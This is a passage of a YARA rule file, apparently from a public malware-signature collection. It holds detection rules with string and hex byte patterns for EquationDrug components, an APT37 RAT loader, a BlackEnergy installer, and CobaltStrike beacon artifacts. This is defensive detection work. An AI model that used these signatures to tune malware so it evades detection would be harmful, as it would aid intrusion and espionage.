		logic_hash = "4b41af8656ada1b4db7ec11f65aeb2d335f424d8557cfa74a064b40c65627012"
		score = 75
		quality = 60
		tags = ""

	strings:
		$s0 = "Microsoft(R) Windows (TM) Operating System" fullword wide
		$s1 = "Parmsndsrv.dbg" fullword ascii
		$s2 = "\\Registry\\User\\CurrentUser\\" wide
		$s3 = "msndsrv.sys" fullword wide
		$s5 = "\\REGISTRY\\MACHINE\\System\\CurrentControlSet\\Control\\Windows" wide
		$s6 = "\\Device\\%ws_%ws" wide
		$s7 = "\\DosDevices\\%ws" wide
		$s9 = "\\Device\\%ws" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_Equationdrug_Keylogger
{
	meta:
		description = "EquationDrug - Key/clipboard logger driver - msrtvd.sys"
		author = "Florian Roth (Nextron Systems) @4nc4p"
		id = "57b6af34-577b-58ec-9a9e-91911c32270b"
		date = "2015-03-11"
		modified = "2025-03-29"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_equation_fiveeyes.yar#L495-L510"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b93aa17b19575a6e4962d224c5801fb78e9a7bb5"
		logic_hash = "b5db0e6e24979b07cd180fed11545daef281e7b0858a7de001a83c2cbc186557"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "\\registry\\machine\\software\\Microsoft\\Windows NT\\CurrentVersion" wide
		$s2 = "\\registry\\machine\\SYSTEM\\ControlSet001\\Control\\Session Manager\\En" wide
		$s3 = "\\DosDevices\\Gk" wide
		$s5 = "\\Device\\Gk0" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_Equationdrug_Platformorchestrator
{
	meta:
		description = "EquationDrug - Platform orchestrator - mscfg32.dll, svchost32.dll"
		author = "Florian Roth (Nextron Systems) @4nc4p"
		id = "ce19ed3c-9dd9-5cb0-99fe-c04fde057293"
		date = "2015-03-11"
		modified = "2025-03-29"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_equation_fiveeyes.yar#L538-L555"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "febc4f30786db7804008dc9bc1cebdc26993e240"
		logic_hash = "26c3b84a00702f155daa50c8f17e5f37e1aac46adde8a06a711e732a4cd806e9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "SERVICES.EXE" fullword wide
		$s1 = "\\command.com" wide
		$s2 = "Microsoft(R) Windows (TM) Operating System" fullword wide
		$s3 = "LSASS.EXE" fullword wide
		$s4 = "Windows Configuration Services" fullword wide
		$s8 = "unilay.dll" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Equationdrug_Networksniffer5
{
	meta:
		description = "EquationDrug - Network-sniffer/patcher - atmdkdrv.sys"
		author = "Florian Roth (Nextron Systems)"
		id = "9eac2c51-3ad7-5346-a985-39733bc204c2"
		date = "2015-03-11"
		modified = "2023-01-06"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_equation_fiveeyes.yar#L557-L575"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "09399b9bd600d4516db37307a457bc55eedcbd17"
		logic_hash = "84f009e2ef639e5270273a7d9dd2542fdf1386c4c8363071d711e2333a112cd1"
		score = 75
		quality = 60
		tags = ""

	strings:
		$s0 = "Microsoft(R) Windows (TM) Operating System" fullword wide
		$s1 = "\\Registry\\User\\CurrentUser\\" wide
		$s2 = "atmdkdrv.sys" fullword wide
		$s4 = "\\Device\\%ws_%ws" wide
		$s5 = "\\DosDevices\\%ws" wide
		$s6 = "\\Device\\%ws" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_Equationdrug_Filesystem_Filter
{
	meta:
		description = "EquationDrug - Filesystem filter driver - volrec.sys, scsi2mgr.sys"
		author = "Florian Roth (Nextron Systems) @4nc4p"
		id = "7077daf6-3d51-5ff2-bc74-95cb169a7cd2"
		date = "2015-03-11"
		modified = "2025-03-29"
		reference = "http://securelist.com/blog/research/69203/inside-the-equationdrug-espionage-platform/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/spy_equation_fiveeyes.yar#L577-L591"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "57fa4a1abbf39f4899ea76543ebd3688dcc11e13"
		logic_hash = "5da0c279da1b84a41e7d15df3c19cd50af1872156f133de0a367b9140425aa11"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "volrec.sys" fullword wide
		$s1 = "volrec.pdb" fullword ascii
		$s2 = "Volume recognizer driver" fullword wide

	condition:
		all of them
}

rule SIGNATURE_BASE_Hvs_APT37_RAT_Loader
{
	meta:
		description = "BLINDINGCAN RAT loader named iconcash.db used by APT37"
		author = "Marc Stroebel"
		id = "6c3e8465-d607-59bf-85fc-5abbef71fb1c"
		date = "2020-12-15"
		modified = "2023-12-05"
		reference = "https://us-cert.cisa.gov/ncas/analysis-reports/ar20-232a"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_lazarus_dec20.yar#L52-L65"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b70e66d387e42f5f04b69b9eb15306036702ab8a50b16f5403289b5388292db9"
		logic_hash = "241f2683adc29e8aca30ae24278f3703fef0fed6b276dae488fdb32c167af1c9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	condition:
		(pe.version_info [ "OriginalFilename" ] contains "MFC_DLL.dll" ) and ( pe.exports ( "SMain" ) and pe.exports ( "SMainW" ) )
}

rule SIGNATURE_BASE_Blackenergy3_Installer
{
	meta:
		description = "Matches unique code block for import name construction "
		author = "Mike Schladt"
		id = "4afeb7ac-ce8d-506c-9c97-db7ec6102490"
		date = "2015-05-29"
		modified = "2023-12-05"
		reference = "https://www.f-secure.com/documents/996508/1030745/blackenergy_whitepaper.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_blackenergy_installer.yar#L2-L16"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "78387651dd9608fcdf6bfb9df8b84db4"
		hash = "78636f7bbd52ea80d79b4e2a7882403092bbb02d"
		logic_hash = "c4c562124427fd394b56e48f16f2d262c8a717fc750b955b2b2a35acb478d5e7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$import_names = { C7 45 D0 75 73 65 72 C7 45 D4 33 32 2E 64 66 C7 45 D8 6C 6C 88 5D DA C7 45 84 61 64 76 61 C7 45 88 70 69 33 32 C7 45 8C 2E 64 6C 6C 88 5D 90 C7 45 B8 77 69 6E 69 C7 45 BC 6E 65 74 2E C7 45 C0 64 6C 6C 00 C7 45 C4 77 73 32 5F C7 45 C8 33 32 2E 64 66 C7 45 CC 6C 6C 88 5D CE C7 45 94 73 68 65 6C C7 45 98 6C 33 32 2E C7 45 9C 64 6C 6C 00 C7 45 E8 70 73 61 70 C7 45 EC 69 2E 64 6C 66 C7 45 F0 6C 00 C7 85 74 FF FF FF 6E 65 74 61 C7 85 78 FF FF FF 70 69 33 32 C7 85 7C FF FF FF 2E 64 6C 6C 88 5D 80 C7 85 64 FF FF FF 6F 6C 65 61 C7 85 68 FF FF FF 75 74 33 32 C7 85 6C FF FF FF 2E 64 6C 6C 88 9D 70 FF FF FF C7 45 DC 6F 6C 65 33 C7 45 E0 32 2E 64 6C 66 C7 45 E4 6C 00 C7 45 A0 76 65 72 73 C7 45 A4 69 6F 6E 2E C7 45 A8 64 6C 6C 00 C7 85 54 FF FF FF 69 6D 61 67 C7 85 58 FF FF FF 65 68 6C 70 C7 85 5C FF FF FF 2E 64 6C 6C 88 9D 60 FF FF FF C7 45 AC 61 70 70 68 C7 45 B0 65 6C 70 2E C7 45 B4 64 6C 6C 00 C7 45 F4 2E 64 6C 6C 88 5D F8 }

	condition:
		any of them
}

rule SIGNATURE_BASE_Cobaltstrike_Sleep_Decoder_Indicator
{
	meta:
		description = "Detects CobaltStrike sleep_mask decoder"
		author = "yara@s3c.za.net"
		id = "d5b53d68-55f9-5837-9b0c-e7be2f3bd072"
		date = "2021-07-19"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_cobaltstrike_evasive.yar#L16-L26"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "f3243c326df18edbd15c2d9120379588e61709efb9295b9584c0565c04ee38a5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$sleep_decoder = { 48 89 5C 24 08 48 89 6C 24 10 48 89 74 24 18 57 48 83 EC 20 4C 8B 51 08 41 8B F0 48 8B EA 48 8B D9 45 8B 0A 45 8B 5A 04 4D 8D 52 08 45 85 C9 }

	condition:
		$sleep_decoder
}

rule SIGNATURE_BASE_Cobaltstrike_C2_Encoded_XOR_Config_Indicator
{
	meta:
		description = "Detects CobaltStrike C2 encoded profile configuration"
		author = "yara@s3c.za.net"
		id = "8e33c63d-eaba-5851-88f4-ef7261a0a618"
		date = "2021-07-08"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_cobaltstrike_evasive.yar#L28-L295"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "6b25ee9064e925c183ef7599c95ecffce48c7f96eea714fa5f6441b21716277e"
		score = 75
		quality = 60
		tags = ""

	strings:
		$s000 = { 00 01 00 01 00 02 ?? ?? 00 02 00 01 00 02 ?? ?? 00 03 00 02 00 04 ?? ?? ?? ?? 00 04 00 02 00 04 ?? ?? ?? ?? 00 05 00 01 00 02 ?? ?? }
		$s001 = { 01 00 01 00 01 03 ?? ?? 01 03 01 00 01 03 ?? ?? 01 02 01 03 01 05 ?? ?? ?? ?? 01 05 01 03 01 05 ?? ?? ?? ?? 01 04 01 00 01 03 ?? ?? }
		$s002 = { 02 03 02 03 02 00 ?? ?? 02 00 02 03 02 00 ?? ?? 02 01 02 00 02 06 ?? ?? ?? ?? 02 06 02 00 02 06 ?? ?? ?? ?? 02 07 02 03 02 00 ?? ?? }
		$s003 = { 03 02 03 02 03 01 ?? ?? 03 01 03 02 03 01 ?? ?? 03 00 03 01 03 07 ?? ?? ?? ?? 03 07 03 01 03 07 ?? ?? ?? ?? 03 06 03 02 03 01 ?? ?? }
		$s004 = { 04 05 04 05 04 06 ?? ?? 04 06 04 05 04 06 ?? ?? 04 07 04 06 04 00 ?? ?? ?? ?? 04 00 04 06 04 00 ?? ?? ?? ?? 04 01 04 05 04 06 ?? ?? }
		$s005 = { 05 04 05 04 05 07 ?? ?? 05 07 05 04 05 07 ?? ?? 05 06 05 07 05 01 ?? ?? ?? ?? 05 01 05 07 05 01 ?? ?? ?? ?? 05 00 05 04 05 07 ?? ?? }
		$s006 = { 06 07 06 07 06 04 ?? ?? 06 04 06 07 06 04 ?? ?? 06 05 06 04 06 02 ?? ?? ?? ?? 06 02 06 04 06 02 ?? ?? ?? ?? 06 03 06 07 06 04 ?? ?? }
		$s007 = { 07 06 07 06 07 05 ?? ?? 07 05 07 06 07 05 ?? ?? 07 04 07 05 07 03 ?? ?? ?? ?? 07 03 07 05 07 03 ?? ?? ?? ?? 07 02 07 06 07 05 ?? ?? }
		$s008 = { 08 09 08 09 08 0A ?? ?? 08 0A 08 09 08 0A ?? ?? 08 0B 08 0A 08 0C ?? ?? ?? ?? 08 0C 08 0A 08 0C ?? ?? ?? ?? 08 0D 08 09 08 0A ?? ?? }
		$s009 = { 09 08 09 08 09 0B ?? ?? 09 0B 09 08 09 0B ?? ?? 09 0A 09 0B 09 0D ?? ?? ?? ?? 09 0D 09 0B 09 0D ?? ?? ?? ?? 09 0C 09 08 09 0B ?? ?? }
		$s010 = { 0A 0B 0A 0B 0A 08 ?? ?? 0A 08 0A 0B 0A 08 ?? ?? 0A 09 0A 08 0A 0E ?? ?? ?? ?? 0A 0E 0A 08 0A 0E ?? ?? ?? ?? 0A 0F 0A 0B 0A 08 ?? ?? }
		$s011 = { 0B 0A 0B 0A 0B 09 ?? ?? 0B 09 0B 0A 0B 09 ?? ?? 0B 08 0B 09 0B 0F ?? ?? ?? ?? 0B 0F 0B 09 0B 0F ?? ?? ?? ?? 0B 0E 0B 0A 0B 09 ?? ?? }
		$s012 = { 0C 0D 0C 0D 0C 0E ?? ?? 0C 0E 0C 0D 0C 0E ?? ?? 0C 0F 0C 0E 0C 08 ?? ?? ?? ?? 0C 08 0C 0E 0C 08 ?? ?? ?? ?? 0C 09 0C 0D 0C 0E ?? ?? }
		$s013 = { 0D 0C 0D 0C 0D 0F ?? ?? 0D 0F 0D 0C 0D 0F ?? ?? 0D 0E 0D 0F 0D 09 ?? ?? ?? ?? 0D 09 0D 0F 0D 09 ?? ?? ?? ?? 0D 08 0D 0C 0D 0F ?? ?? }
		$s014 = { 0E 0F 0E 0F 0E 0C ?? ?? 0E 0C 0E 0F 0E 0C ?? ?? 0E 0D 0E 0C 0E 0A ?? ?? ?? ?? 0E 0A 0E 0C 0E 0A ?? ?? ?? ?? 0E 0B 0E 0F 0E 0C ?? ?? }
		$s015 = { 0F 0E 0F 0E 0F 0D ?? ?? 0F 0D 0F 0E 0F 0D ?? ?? 0F 0C 0F 0D 0F 0B ?? ?? ?? ?? 0F 0B 0F 0D 0F 0B ?? ?? ?? ?? 0F 0A 0F 0E 0F 0D ?? ?? }
		$s016 = { 10 11 10 11 10 12 ?? ?? 10 12 10 11 10 12 ?? ?? 10 13 10 12 10 14 ?? ?? ?? ?? 10 14 10 12 10 14 ?? ?? ?? ?? 10 15 10 11 10 12 ?? ?? }
		$s017 = { 11 10 11 10 11 13 ?? ?? 11 13 11 10 11 13 ?? ?? 11 12 11 13 11 15 ?? ?? ?? ?? 11 15 11 13 11 15 ?? ?? ?? ?? 11 14 11 10 11 13 ?? ?? }
		$s018 = { 12 13 12 13 12 10 ?? ?? 12 10 12 13 12 10 ?? ?? 12 11 12 10 12 16 ?? ?? ?? ?? 12 16 12 10 12 16 ?? ?? ?? ?? 12 17 12 13 12 10 ?? ?? }
		$s019 = { 13 12 13 12 13 11 ?? ?? 13 11 13 12 13 11 ?? ?? 13 10 13 11 13 17 ?? ?? ?? ?? 13 17 13 11 13 17 ?? ?? ?? ?? 13 16 13 12 13 11 ?? ?? }
		$s020 = { 14 15 14 15 14 16 ?? ?? 14 16 14 15 14 16 ?? ?? 14 17 14 16 14 10 ?? ?? ?? ?? 14 10 14 16 14 10 ?? ?? ?? ?? 14 11 14 15 14 16 ?? ?? }
		$s021 = { 15 14 15 14 15 17 ?? ?? 15 17 15 14 15 17 ?? ?? 15 16 15 17 15 11 ?? ?? ?? ?? 15 11 15 17 15 11 ?? ?? ?? ?? 15 10 15 14 15 17 ?? ?? }
		$s022 = { 16 17 16 17 16 14 ?? ?? 16 14 16 17 16 14 ?? ?? 16 15 16 14 16 12 ?? ?? ?? ?? 16 12 16 14 16 12 ?? ?? ?? ?? 16 13 16 17 16 14 ?? ?? }
		$s023 = { 17 16 17 16 17 15 ?? ?? 17 15 17 16 17 15 ?? ?? 17 14 17 15 17 13 ?? ?? ?? ?? 17 13 17 15 17 13 ?? ?? ?? ?? 17 12 17 16 17 15 ?? ?? }
		$s024 = { 18 19 18 19 18 1A ?? ?? 18 1A 18 19 18 1A ?? ?? 18 1B 18 1A 18 1C ?? ?? ?? ?? 18 1C 18 1A 18 1C ?? ?? ?? ?? 18 1D 18 19 18 1A ?? ?? }
		$s025 = { 19 18 19 18 19 1B ?? ?? 19 1B 19 18 19 1B ?? ?? 19 1A 19 1B 19 1D ?? ?? ?? ?? 19 1D 19 1B 19 1D ?? ?? ?? ?? 19 1C 19 18 19 1B ?? ?? }
		$s026 = { 1A 1B 1A 1B 1A 18 ?? ?? 1A 18 1A 1B 1A 18 ?? ?? 1A 19 1A 18 1A 1E ?? ?? ?? ?? 1A 1E 1A 18 1A 1E ?? ?? ?? ?? 1A 1F 1A 1B 1A 18 ?? ?? }
		$s027 = { 1B 1A 1B 1A 1B 19 ?? ?? 1B 19 1B 1A 1B 19 ?? ?? 1B 18 1B 19 1B 1F ?? ?? ?? ?? 1B 1F 1B 19 1B 1F ?? ?? ?? ?? 1B 1E 1B 1A 1B 19 ?? ?? }
		$s028 = { 1C 1D 1C 1D 1C 1E ?? ?? 1C 1E 1C 1D 1C 1E ?? ?? 1C 1F 1C 1E 1C 18 ?? ?? ?? ?? 1C 18 1C 1E 1C 18 ?? ?? ?? ?? 1C 19 1C 1D 1C 1E ?? ?? }
		$s029 = { 1D 1C 1D 1C 1D 1F ?? ?? 1D 1F 1D 1C 1D 1F ?? ?? 1D 1E 1D 1F 1D 19 ?? ?? ?? ?? 1D 19 1D 1F 1D 19 ?? ?? ?? ?? 1D 18 1D 1C 1D 1F ?? ?? }
		$s030 = { 1E 1F 1E 1F 1E 1C ?? ?? 1E 1C 1E 1F 1E 1C ?? ?? 1E 1D 1E 1C 1E 1A ?? ?? ?? ?? 1E 1A 1E 1C 1E 1A ?? ?? ?? ?? 1E 1B 1E 1F 1E 1C ?? ?? }
		$s031 = { 1F 1E 1F 1E 1F 1D ?? ?? 1F 1D 1F 1E 1F 1D ?? ?? 1F 1C 1F 1D 1F 1B ?? ?? ?? ?? 1F 1B 1F 1D 1F 1B ?? ?? ?? ?? 1F 1A 1F 1E 1F 1D ?? ?? }
		$s032 = { 20 21 20 21 20 22 ?? ?? 20 22 20 21 20 22 ?? ?? 20 23 20 22 20 24 ?? ?? ?? ?? 20 24 20 22 20 24 ?? ?? ?? ?? 20 25 20 21 20 22 ?? ?? }
		$s033 = { 21 20 21 20 21 23 ?? ?? 21 23 21 20 21 23 ?? ?? 21 22 21 23 21 25 ?? ?? ?? ?? 21 25 21 23 21 25 ?? ?? ?? ?? 21 24 21 20 21 23 ?? ?? }
		$s034 = { 22 23 22 23 22 20 ?? ?? 22 20 22 23 22 20 ?? ?? 22 21 22 20 22 26 ?? ?? ?? ?? 22 26 22 20 22 26 ?? ?? ?? ?? 22 27 22 23 22 20 ?? ?? }
		$s035 = { 23 22 23 22 23 21 ?? ?? 23 21 23 22 23 21 ?? ?? 23 20 23 21 23 27 ?? ?? ?? ?? 23 27 23 21 23 27 ?? ?? ?? ?? 23 26 23 22 23 21 ?? ?? }
		$s036 = { 24 25 24 25 24 26 ?? ?? 24 26 24 25 24 26 ?? ?? 24 27 24 26 24 20 ?? ?? ?? ?? 24 20 24 26 24 20 ?? ?? ?? ?? 24 21 24 25 24 26 ?? ?? }
		$s037 = { 25 24 25 24 25 27 ?? ?? 25 27 25 24 25 27 ?? ?? 25 26 25 27 25 21 ?? ?? ?? ?? 25 21 25 27 25 21 ?? ?? ?? ?? 25 20 25 24 25 27 ?? ?? }
		$s038 = { 26 27 26 27 26 24 ?? ?? 26 24 26 27 26 24 ?? ?? 26 25 26 24 26 22 ?? ?? ?? ?? 26 22 26 24 26 22 ?? ?? ?? ?? 26 23 26 27 26 24 ?? ?? }
		$s039 = { 27 26 27 26 27 25 ?? ?? 27 25 27 26 27 25 ?? ?? 27 24 27 25 27 23 ?? ?? ?? ?? 27 23 27 25 27 23 ?? ?? ?? ?? 27 22 27 26 27 25 ?? ?? }
		$s040 = { 28 29 28 29 28 2A ?? ?? 28 2A 28 29 28 2A ?? ?? 28 2B 28 2A 28 2C ?? ?? ?? ?? 28 2C 28 2A 28 2C ?? ?? ?? ?? 28 2D 28 29 28 2A ?? ?? }
		$s041 = { 29 28 29 28 29 2B ?? ?? 29 2B 29 28 29 2B ?? ?? 29 2A 29 2B 29 2D ?? ?? ?? ?? 29 2D 29 2B 29 2D ?? ?? ?? ?? 29 2C 29 28 29 2B ?? ?? }
		$s042 = { 2A 2B 2A 2B 2A 28 ?? ?? 2A 28 2A 2B 2A 28 ?? ?? 2A 29 2A 28 2A 2E ?? ?? ?? ?? 2A 2E 2A 28 2A 2E ?? ?? ?? ?? 2A 2F 2A 2B 2A 28 ?? ?? }
		$s043 = { 2B 2A 2B 2A 2B 29 ?? ?? 2B 29 2B 2A 2B 29 ?? ?? 2B 28 2B 29 2B 2F ?? ?? ?? ?? 2B 2F 2B 29 2B 2F ?? ?? ?? ?? 2B 2E 2B 2A 2B 29 ?? ?? }
		$s044 = { 2C 2D 2C 2D 2C 2E ?? ?? 2C 2E 2C 2D 2C 2E ?? ?? 2C 2F 2C 2E 2C 28 ?? ?? ?? ?? 2C 28 2C 2E 2C 28 ?? ?? ?? ?? 2C 29 2C 2D 2C 2E ?? ?? }
		$s045 = { 2D 2C 2D 2C 2D 2F ?? ?? 2D 2F 2D 2C 2D 2F ?? ?? 2D 2E 2D 2F 2D 29 ?? ?? ?? ?? 2D 29 2D 2F 2D 29 ?? ?? ?? ?? 2D 28 2D 2C 2D 2F ?? ?? }
		$s046 = { 2E 2F 2E 2F 2E 2C ?? ?? 2E 2C 2E 2F 2E 2C ?? ?? 2E 2D 2E 2C 2E 2A ?? ?? ?? ?? 2E 2A 2E 2C 2E 2A ?? ?? ?? ?? 2E 2B 2E 2F 2E 2C ?? ?? }
		$s047 = { 2F 2E 2F 2E 2F 2D ?? ?? 2F 2D 2F 2E 2F 2D ?? ?? 2F 2C 2F 2D 2F 2B ?? ?? ?? ?? 2F 2B 2F 2D 2F 2B ?? ?? ?? ?? 2F 2A 2F 2E 2F 2D ?? ?? }
		$s048 = { 30 31 30 31 30 32 ?? ?? 30 32 30 31 30 32 ?? ?? 30 33 30 32 30 34 ?? ?? ?? ?? 30 34 30 32 30 34 ?? ?? ?? ?? 30 35 30 31 30 32 ?? ?? }
		$s049 = { 31 30 31 30 31 33 ?? ?? 31 33 31 30 31 33 ?? ?? 31 32 31 33 31 35 ?? ?? ?? ?? 31 35 31 33 31 35 ?? ?? ?? ?? 31 34 31 30 31 33 ?? ?? }
		$s050 = { 32 33 32 33 32 30 ?? ?? 32 30 32 33 32 30 ?? ?? 32 31 32 30 32 36 ?? ?? ?? ?? 32 36 32 30 32 36 ?? ?? ?? ?? 32 37 32 33 32 30 ?? ?? }
		$s051 = { 33 32 33 32 33 31 ?? ?? 33 31 33 32 33 31 ?? ?? 33 30 33 31 33 37 ?? ?? ?? ?? 33 37 33 31 33 37 ?? ?? ?? ?? 33 36 33 32 33 31 ?? ?? }
		$s052 = { 34 35 34 35 34 36 ?? ?? 34 36 34 35 34 36 ?? ?? 34 37 34 36 34 30 ?? ?? ?? ?? 34 30 34 36 34 30 ?? ?? ?? ?? 34 31 34 35 34 36 ?? ?? }
		$s053 = { 35 34 35 34 35 37 ?? ?? 35 37 35 34 35 37 ?? ?? 35 36 35 37 35 31 ?? ?? ?? ?? 35 31 35 37 35 31 ?? ?? ?? ?? 35 30 35 34 35 37 ?? ?? }
		$s054 = { 36 37 36 37 36 34 ?? ?? 36 34 36 37 36 34 ?? ?? 36 35 36 34 36 32 ?? ?? ?? ?? 36 32 36 34 36 32 ?? ?? ?? ?? 36 33 36 37 36 34 ?? ?? }
		$s055 = { 37 36 37 36 37 35 ?? ?? 37 35 37 36 37 35 ?? ?? 37 34 37 35 37 33 ?? ?? ?? ?? 37 33 37 35 37 33 ?? ?? ?? ?? 37 32 37 36 37 35 ?? ?? }
		$s056 = { 38 39 38 39 38 3A ?? ?? 38 3A 38 39 38 3A ?? ?? 38 3B 38 3A 38 3C ?? ?? ?? ?? 38 3C 38 3A 38 3C ?? ?? ?? ?? 38 3D 38 39 38 3A ?? ?? }
		$s057 = { 39 38 39 38 39 3B ?? ?? 39 3B 39 38 39 3B ?? ?? 39 3A 39 3B 39 3D ?? ?? ?? ?? 39 3D 39 3B 39 3D ?? ?? ?? ?? 39 3C 39 38 39 3B ?? ?? }
		$s058 = { 3A 3B 3A 3B 3A 38 ?? ?? 3A 38 3A 3B 3A 38 ?? ?? 3A 39 3A 38 3A 3E ?? ?? ?? ?? 3A 3E 3A 38 3A 3E ?? ?? ?? ?? 3A 3F 3A 3B 3A 38 ?? ?? }
		$s059 = { 3B 3A 3B 3A 3B 39 ?? ?? 3B 39 3B 3A 3B 39 ?? ?? 3B 38 3B 39 3B 3F ?? ?? ?? ?? 3B 3F 3B 39 3B 3F ?? ?? ?? ?? 3B 3E 3B 3A 3B 39 ?? ?? }
		$s060 = { 3C 3D 3C 3D 3C 3E ?? ?? 3C 3E 3C 3D 3C 3E ?? ?? 3C 3F 3C 3E 3C 38 ?? ?? ?? ?? 3C 38 3C 3E 3C 38 ?? ?? ?? ?? 3C 39 3C 3D 3C 3E ?? ?? }
		$s061 = { 3D 3C 3D 3C 3D 3F ?? ?? 3D 3F 3D 3C 3D 3F ?? ?? 3D 3E 3D 3F 3D 39 ?? ?? ?? ?? 3D 39 3D 3F 3D 39 ?? ?? ?? ?? 3D 38 3D 3C 3D 3F ?? ?? }
		$s062 = { 3E 3F 3E 3F 3E 3C ?? ?? 3E 3C 3E 3F 3E 3C ?? ?? 3E 3D 3E 3C 3E 3A ?? ?? ?? ?? 3E 3A 3E 3C 3E 3A ?? ?? ?? ?? 3E 3B 3E 3F 3E 3C ?? ?? }
		$s063 = { 3F 3E 3F 3E 3F 3D ?? ?? 3F 3D 3F 3E 3F 3D ?? ?? 3F 3C 3F 3D 3F 3B ?? ?? ?? ?? 3F 3B 3F 3D 3F 3B ?? ?? ?? ?? 3F 3A 3F 3E 3F 3D ?? ?? }
		$s064 = { 40 41 40 41 40 42 ?? ?? 40 42 40 41 40 42 ?? ?? 40 43 40 42 40 44 ?? ?? ?? ?? 40 44 40 42 40 44 ?? ?? ?? ?? 40 45 40 41 40 42 ?? ?? }
		$s065 = { 41 40 41 40 41 43 ?? ?? 41 43 41 40 41 43 ?? ?? 41 42 41 43 41 45 ?? ?? ?? ?? 41 45 41 43 41 45 ?? ?? ?? ?? 41 44 41 40 41 43 ?? ?? }
		$s066 = { 42 43 42 43 42 40 ?? ?? 42 40 42 43 42 40 ?? ?? 42 41 42 40 42 46 ?? ?? ?? ?? 42 46 42 40 42 46 ?? ?? ?? ?? 42 47 42 43 42 40 ?? ?? }
		$s067 = { 43 42 43 42 43 41 ?? ?? 43 41 43 42 43 41 ?? ?? 43 40 43 41 43 47 ?? ?? ?? ?? 43 47 43 41 43 47 ?? ?? ?? ?? 43 46 43 42 43 41 ?? ?? }
		$s068 = { 44 45 44 45 44 46 ?? ?? 44 46 44 45 44 46 ?? ?? 44 47 44 46 44 40 ?? ?? ?? ?? 44 40 44 46 44 40 ?? ?? ?? ?? 44 41 44 45 44 46 ?? ?? }
		$s069 = { 45 44 45 44 45 47 ?? ?? 45 47 45 44 45 47 ?? ?? 45 46 45 47 45 41 ?? ?? ?? ?? 45 41 45 47 45 41 ?? ?? ?? ?? 45 40 45 44 45 47 ?? ?? }
		$s070 = { 46 47 46 47 46 44 ?? ?? 46 44 46 47 46 44 ?? ?? 46 45 46 44 46 42 ?? ?? ?? ?? 46 42 46 44 46 42 ?? ?? ?? ?? 46 43 46 47 46 44 ?? ?? }
		$s071 = { 47 46 47 46 47 45 ?? ?? 47 45 47 46 47 45 ?? ?? 47 44 47 45 47 43 ?? ?? ?? ?? 47 43 47 45 47 43 ?? ?? ?? ?? 47 42 47 46 47 45 ?? ?? }
		$s072 = { 48 49 48 49 48 4A ?? ?? 48 4A 48 49 48 4A ?? ?? 48 4B 48 4A 48 4C ?? ?? ?? ?? 48 4C 48 4A 48 4C ?? ?? ?? ?? 48 4D 48 49 48 4A ?? ?? }
		$s073 = { 49 48 49 48 49 4B ?? ?? 49 4B 49 48 49 4B ?? ?? 49 4A 49 4B 49 4D ?? ?? ?? ?? 49 4D 49 4B 49 4D ?? ?? ?? ?? 49 4C 49 48 49 4B ?? ?? }
		$s074 = { 4A 4B 4A 4B 4A 48 ?? ?? 4A 48 4A 4B 4A 48 ?? ?? 4A 49 4A 48 4A 4E ?? ?? ?? ?? 4A 4E 4A 48 4A 4E ?? ?? ?? ?? 4A 4F 4A 4B 4A 48 ?? ?? }
		$s075 = { 4B 4A 4B 4A 4B 49 ?? ?? 4B 49 4B 4A 4B 49 ?? ?? 4B 48 4B 49 4B 4F ?? ?? ?? ?? 4B 4F 4B 49 4B 4F ?? ?? ?? ?? 4B 4E 4B 4A 4B 49 ?? ?? }
		$s076 = { 4C 4D 4C 4D 4C 4E ?? ?? 4C 4E 4C 4D 4C 4E ?? ?? 4C 4F 4C 4E 4C 48 ?? ?? ?? ?? 4C 48 4C 4E 4C 48 ?? ?? ?? ?? 4C 49 4C 4D 4C 4E ?? ?? }
